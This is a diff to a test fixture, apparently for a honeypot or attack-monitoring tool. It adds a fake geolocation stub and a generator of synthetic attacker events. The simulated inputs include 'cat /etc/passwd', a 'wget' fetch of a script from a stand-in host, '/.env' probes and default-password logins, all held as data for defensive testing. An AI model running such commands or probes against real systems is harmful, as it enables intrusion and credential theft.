@@ -30,7 +30,7 @@ from agents.addresses import public_for_tests  # noqa: E402
 from agents.playbooks import Playbook  # noqa: E402
 from agents.respond import approve, queue_enforce_action, reject  # noqa: E402
 from agents.source_state import SourceState, new_entry  # noqa: E402
-from agents.triage import CredentialStats, Ioc, TriageRecord  # noqa: E402
+from agents.triage import CredentialStats, GeoInfo, Ioc, TriageRecord  # noqa: E402
 from agents.ui.api import ApiPaths  # noqa: E402
 from listeners.events import EventWriter  # noqa: E402
 
@@ -107,6 +107,103 @@ def _append(path: Path, lines: list[dict]) -> None:
     with open(path, "a", encoding="utf-8") as f:
         for line in lines:
             f.write(json.dumps(line) + "\n")
+
+
+# ---- the map: invented places for documentation addresses ----------------------------------
+
+# Address -> (country code, country, city, (latitude, longitude)). The real lookup places no
+# documentation address; ``FakeGeo`` stands in for it so the map has somewhere to draw.
+MAP_PLACES = {
+    "198.51.100.7": ("DE", "Germany", "Frankfurt am Main", (50.1, 8.7)),
+    "198.51.100.8": ("BR", "Brazil", "São Paulo", (-23.5, -46.6)),
+    "198.51.100.20": ("US", "United States", "Ashburn", (39.0, -77.5)),
+    "198.51.100.21": ("NL", "Netherlands", "Amsterdam", (52.4, 4.9)),
+    "198.51.100.66": ("SG", "Singapore", SCRIPT, (1.3, 103.8)),
+    "203.0.113.10": ("CN", "China", "Shanghai", (31.2, 121.5)),
+    "203.0.113.11": ("IN", "India", "Mumbai", (19.1, 72.9)),
+    "203.0.113.12": ("RU", "Russia", "Moscow", (55.8, 37.6)),
+    "203.0.113.13": ("ZA", "South Africa", "Johannesburg", (-26.2, 28.0)),
+    "203.0.113.14": ("AU", "Australia", "Sydney", (-33.9, 151.2)),
+    "203.0.113.15": ("JP", "Japan", "Tokyo", (35.7, 139.7)),
+    "203.0.113.16": ("US", "United States", "San Jose", (37.3, -121.9)),
+    "203.0.113.17": ("KR", "South Korea", "Seoul", (37.6, 127.0)),
+    "203.0.113.18": ("VN", "Vietnam", "Hanoi", (21.0, 105.8)),
+    "203.0.113.19": ("GB", "United Kingdom", "London", (51.5, -0.1)),
+    "203.0.113.20": ("IR", "Iran", "Tehran", (35.7, 51.4)),
+    "203.0.113.21": ("NG", "Nigeria", "Lagos", (6.5, 3.4)),
+    "203.0.113.22": ("AR", "Argentina", "Buenos Aires", (-34.6, -58.4)),
+    "203.0.113.23": ("CA", "Canada", "Toronto", (43.7, -79.4)),
+    "203.0.113.24": ("FR", "France", "Paris", (48.9, 2.4)),
+}
+# Services, the port each listens on, and what an event of each looks like.
+MAP_SERVICES = [("ssh", 22), ("http", 8080), ("telnet", 23), ("ftp", 21), ("redis", 6379),
+                ("sip", 5060), ("mysql", 3306), ("smtp", 25)]
+
+
+class FakeGeo:
+    """``GeoLookup``'s shape (``lookup``, ``point``, ``enabled``) over ``MAP_PLACES``."""
+
+    enabled = True
+    attribution = ""
+
+    def __init__(self, places: dict = MAP_PLACES) -> None:
+        self.places = places
+
+    def __call__(self, address):
+        return self.lookup(address)
+
+    def lookup(self, address):
+        hit = self.places.get(address) if isinstance(address, str) else None
+        if hit is None:
+            return None
+        return GeoInfo(country_code=hit[0], country=hit[1], city=hit[2], asn=64500,
+                       as_org="Example Hosting")
+
+    def point(self, address):
+        hit = self.places.get(address) if isinstance(address, str) else None
+        return hit[3] if hit is not None else None
+
+
+def map_lines(start: datetime.datetime, count: int, step: float = 1.0, seed: int = 7,
+              sources=None) -> list[dict]:
+    """``count`` listener and SSH lines, ``step`` seconds apart from ``start``, from the
+    ``MAP_PLACES`` sources and one unlocated one, across ``MAP_SERVICES``."""
+    import random
+
+    rng = random.Random(seed)
+    sources = list(sources or MAP_PLACES) + ["192.0.2.99"]
+    out = []
+    for i in range(count):
+        when = _ts(start + datetime.timedelta(seconds=i * step))
+        src = rng.choice(sources)
+        service, port = rng.choice(MAP_SERVICES)
+        base = {"timestamp": when, "task_name": f"{service}-{seed:02d}{i:05d}", "src_ip": src,
+                "src_port": 40000 + i % 20000, "dst_ip": "10.0.0.5", "dst_port": port,
+                "sensor_name": "fixture", "sensor_protocol": service}
+        if service == "ssh":
+            if rng.random() < 0.5:
+                out.append(dict(base, level="INFO", message="Authentication failed",
+                                username=rng.choice(["root", "admin", "ubuntu"]),
+                                password="123456"))
+            else:
+                out.append(dict(base, level="INFO", message="User input", interactive=True,
+                                details=_b64(rng.choice(["uname -a", "cat /etc/passwd",
+                                                         "wget -q -O- example.test/x.sh"]))))
+        elif service in ("http", "sip"):
+            path = rng.choice(["/.env", "/env.js", "/wp-login.php", "/api/v1/users"])
+            out.append(dict(base, message="command", event="command",
+                            data={"method": "GET", "path": path,
+                                  "status": rng.choice([200, 404])} if service == "http"
+                            else {"dialed": "1000", "stage": "invite"}))
+        elif rng.random() < 0.5:
+            out.append(dict(base, message="auth_attempt", event="auth_attempt",
+                            username=rng.choice(["admin", "sa", "default"]), password="x",
+                            success=False))
+        else:
+            out.append(dict(base, message="command", event="command",
+                            data={"command": rng.choice(["INFO", "SELECT version()",
+                                                         "CONFIG GET dir", "EHLO x"])}))
+    return out
 
 
 def _record(rid: str, kind: str, protocol: str, ip: str, seen: datetime.datetime,
